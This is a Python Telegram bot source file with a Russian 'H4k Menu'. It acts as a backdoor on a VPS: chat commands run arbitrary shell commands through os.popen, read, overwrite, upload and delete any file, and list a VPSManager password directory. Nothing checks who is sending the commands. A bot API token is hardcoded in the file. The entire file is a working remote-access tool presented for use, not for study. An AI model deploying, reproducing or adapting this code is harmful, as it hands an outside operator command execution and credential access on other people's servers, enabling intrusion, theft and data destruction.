import os
from aiogram import Bot, Dispatcher, types

API_TOKEN = '7198103718:AAEFfDtmxOatlTWxU-ieKRC7bYDEdN3FSnk'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['info'])
async def show_info(message: types.Message):
    info_text = """
    [🥵] H4k Menu
1. /del {путь}/{файл} < Удаляет файл
2. /list {путь} < Список файлов и т.д.
3. /ssh < Читает и пишет лист файлов папки /etc/VPSManager/senha
4. /read {путь} < Читает файл и пишет
5. /add {путь} < Добавляет файл
6. /textadd {путь} {текст} {название}.{формат} < Добавляет файл текстом
7. /interpreter {команда} < Отправляет команду на исполнение
8. /edit {путь} {текст} < Замена текста
"""
    await message.reply(info_text)

@dp.message_handler(commands=['interpreter'])
async def interpreter_command(message: types.Message):
    command = message.get_args()
    result = await send_command_to_vps(command)
    await message.reply(result)

async def send_command_to_vps(command):
    result = os.popen(command).read()
    return result

@dp.message_handler(commands=['edit'])
async def edit_file(message: types.Message):
    args = message.get_args().split(' ', 1)
    if len(args) == 2:
        path, new_text = args
        if os.path.exists(path):
            with open(path, 'w') as file:
                file.write(new_text)
            await message.reply("Текст внутри файла изменен.")
        else:
            await message.reply("Файл не существует.")
    else:
        await message.reply("Используйте команду в формате /edit {путь} {текст}.")

@dp.message_handler(commands=['read'])
async def read_file(message: types.Message):
    path = message.get_args()
    if os.path.exists(path):
        with open(path, 'r') as file:
            content = file.read()
        await message.reply(content)
    else:
        await message.reply("Файл или директория не существует.")

@dp.message_handler(commands=['add'])
async def save_file(message: types.Message):
    args = message.get_args()
    if message.reply_to_message and message.reply_to_message.document:
        file_id = message.reply_to_message.document.file_id
        file_info = await bot.get_file(file_id)
        file_path = file_info.file_path
        await bot.download_file(file_path, destination=args)
        await message.reply("Файл сохранен.")
    else:
        await message.reply("Ответьте на сообщение с файлом.")

@dp.message_handler(commands=['textadd'])
async def save_text_file(message: types.Message):
    args = message.get_args().split(' ', 1)
    if len(args) == 2:
        path, content = args
        with open(path, 'w') as file:
            file.write(content)
        await message.reply("Файл сохранен.")
    else:
        await message.reply("Используйте команду в формате /textadd {путь} {текст}.")

@dp.message_handler(commands=['del'])
async def delete_file(message: types.Message):
    path = message.get_args()
    if os.path.exists(path):
        os.remove(path)
        await message.reply("Файл или директория удалена.")
    else:
        await message.reply("Файл или директория не существует.")

@dp.message_handler(commands=['ssh'])
async def list_files(message: types.Message):
    path = "/etc/VPSManager/senha"
    if os.path.isdir(path):
        files = os.listdir(path)
        await message.reply('\n'.join(files))
    else:
        await message.reply("Директория не существует.")

@dp.message_handler(commands=['list'])
async def list_files_in_dir(message: types.Message):
    path = message.get_args()
    if os.path.isdir(path):
        files = os.listdir(path)
        await message.reply('\n'.join(files))
    else:
        await message.reply("Директория не существует.")

if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)
